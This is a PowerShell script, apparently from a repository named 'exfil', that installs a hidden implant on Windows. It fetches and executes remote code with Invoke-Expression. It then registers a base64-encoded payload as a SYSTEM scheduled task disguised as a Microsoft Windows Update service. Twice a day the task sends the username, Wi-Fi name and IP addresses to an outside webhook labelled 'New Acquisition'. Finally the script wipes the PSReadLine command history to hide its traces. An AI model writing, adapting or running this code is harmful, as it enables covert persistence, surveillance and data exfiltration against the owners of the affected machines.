<# Core task scheduling with ping install. #>
# Variables.
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
$urlfortc = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/GlobalFiles/TaskSchedulerServiceCreater.ps1"
$STName = "Windows Update Service Daemon"
$psreadlineFolderPath = Join-Path $env:USERPROFILE 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine'

## Script starts from here.
Invoke-Expression (Invoke-WebRequest -Uri $urlfortc -UseBasicParsing -ErrorAction SilentlyContinue).Content
$corescriptcontent = @'
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
$apiurl = "https://hook.eu2.make.com/pgvj9kxtwo4pcrhxwn1kg9p9agp129bl"
$regPath = "HKLM:\Software\WindowsUpdateService"
$regItem = Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue
$code = if ($regItem) { $regItem.Code } else { "Unknown" }
$data = if ($regItem) { $regItem.Data } else { "Unknown" }
$username = ( ( Get-CIMInstance -class Win32_ComputerSystem | Select-Object -ExpandProperty username ) -split '\\' )[1]
function Get-WiFiNetworkName {
    $profilewlan = Get-NetConnectionProfile -ErrorAction SilentlyContinue
    if ($profilewlan -and $profilewlan.InterfaceAlias -like "*W*") {
        return $profilewlan.Name
    } else {
        return "Not connected to a Wi-Fi network."
    }
}
$networkStatus = Get-WiFiNetworkName
$networkInterfaces = Get-NetIPAddress -AddressFamily IPv4 | ForEach-Object {
    $interface = $_.InterfaceAlias
    $ip = $_.IPAddress
    "$interface, {$ip}"
}
$combinedString = $networkInterfaces -join ', '
$message = "New Acquisition **$code**, Current Status **$data**, Logged on user **$username**, Current Network **$networkStatus**, **IPs** *$combinedString*"
Invoke-WebRequest -Uri $apiurl -Method Post -ContentType "text/plain" -Body $message -UseBasicParsing | Out-Null
'@
$bytes = [System.Text.Encoding]::Unicode.GetBytes($corescriptcontent)
$enccmd = [Convert]::ToBase64String($bytes)

#Create Windows Scheduled task
$STAction = New-ScheduledTaskAction `
    -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $enccmd"
# Triggers for scheduled task.
$STTrigger = New-ScheduledTaskTrigger `
    -Once `
    -At ([DateTime]::Now.AddSeconds(10)) `
    -RepetitionDuration (New-TimeSpan -Days 7) `
    -RepetitionInterval (New-TimeSpan -Hours 12) 

# Settings for scheduled task
$STSettings = New-ScheduledTaskSettingsSet `
    -Compatibility Win8 `
    -MultipleInstances IgnoreNew `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -DisallowHardTerminate `
    -Priority 1 `
    -Hidden 

# Registering the scheduled task.
if (Get-ScheduledTask -TaskName $STName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $STName -Confirm:$false -ErrorAction SilentlyContinue
}
Register-ScheduledTask `
    -Action $STAction `
    -Trigger $STTrigger `
    -Settings $STSettings `
    -TaskName $STName `
    -Description "Windows Server Update Services, previously known as Software Update Services, is a computer program and network service developed by Microsoft Corporation that enables administrators to manage the distribution of updates and hotfixes released for Microsoft products to computers in a corporate environment." `
    -User "NT AUTHORITY\SYSTEM" `
    -RunLevel Highest | Out-Null

# Post Registration settings.
$TargetTask = Get-ScheduledTask -TaskName $STName -ErrorAction SilentlyContinue
$TargetTask.Author = 'Microsoft Corporation'
$TargetTask.Triggers[0].StartBoundary = [DateTime]::Now.AddSeconds(10).ToString("yyyy-MM-dd'T'HH:mm:ss")
$TargetTask.Triggers[0].EndBoundary = [DateTime]::Now.AddDays(7).ToString("yyyy-MM-dd'T'HH:mm:ss")
$TargetTask.Settings.AllowHardTerminate = $True
$TargetTask.Settings.DeleteExpiredTaskAfter = 'PT0S'
$TargetTask.Settings.ExecutionTimeLimit = 'PT1H'
$TargetTask.Settings.volatile = $False
$TargetTask | Set-ScheduledTask | Out-Null

#CleanUP
if (Test-Path -Path $psreadlineFolderPath -PathType Container) {
  $files = Get-ChildItem -Path $psreadlineFolderPath
  if ($files.Count -gt 0) {
    Remove-Item -Path "$psreadlineFolderPath\*" -Force
  }
}